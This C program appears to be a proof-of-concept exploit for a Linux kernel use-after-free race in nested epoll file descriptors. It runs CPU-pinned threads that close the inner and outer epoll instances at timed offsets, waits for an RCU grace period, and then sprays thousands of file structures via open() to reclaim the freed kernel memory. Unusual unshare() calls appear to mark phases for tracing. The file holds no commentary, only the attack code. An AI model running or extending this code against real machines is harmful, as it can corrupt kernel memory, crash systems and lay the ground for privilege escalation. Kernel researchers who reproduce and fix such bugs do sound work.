#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <sys/types.h>
#include <sched.h>
#include <stdlib.h>

int outer_epfd;
int inner_epfd;

void pin_to_cpu(int cpu) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu, &cpuset);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpuset) < 0) {
        perror("sched_setaffinity");
    }
}

void *thread2_func(void *arg) {
    pin_to_cpu(1); // Pin Thread 2 to CPU 1
    usleep(50000); 
    // Signal Thread 2 is about to close inner epoll
    unshare(2222);
    close(inner_epfd);
    return NULL;
}

void spray_files(int count) {
    for (int i = 0; i < count; i++) {
        open("/dev/null", O_RDONLY);
    }
}

void *thread3_func(void *arg) {
    pin_to_cpu(1); // Pin Thread 3 to CPU 1
    usleep(1000000); 
    
    // Signal Thread 3 is about to open pipes
    unshare(3333);
    
    // Spray file structs via open() on CPU 1
    spray_files(8000);
    return NULL;
}

int main() {
    pin_to_cpu(0); // Pin main thread (Thread 1) to CPU 0
    
    outer_epfd = epoll_create1(0);
    inner_epfd = epoll_create1(0);
    
    if (outer_epfd < 0 || inner_epfd < 0) {
        return 1;
    }
    
    struct epoll_event ev;
    ev.events = EPOLLIN;
    ev.data.fd = inner_epfd;
    
    if (epoll_ctl(outer_epfd, EPOLL_CTL_ADD, inner_epfd, &ev) < 0) {
        return 1;
    }
    
    pthread_t t2, t3;
    pthread_create(&t2, NULL, thread2_func, NULL);
    pthread_create(&t3, NULL, thread3_func, NULL);
    
    // Signal Thread 1 is about to close outer epoll
    unshare(1111);
    close(outer_epfd);
    
    // Wait for the RCU grace period (same as Thread 3)
    usleep(1000000);
    // Spray file structs via open() on CPU 0
    spray_files(8000);
    
    pthread_join(t2, NULL);
    pthread_join(t3, NULL);
    
    while(1) { sleep(1); }
    return 0;
}
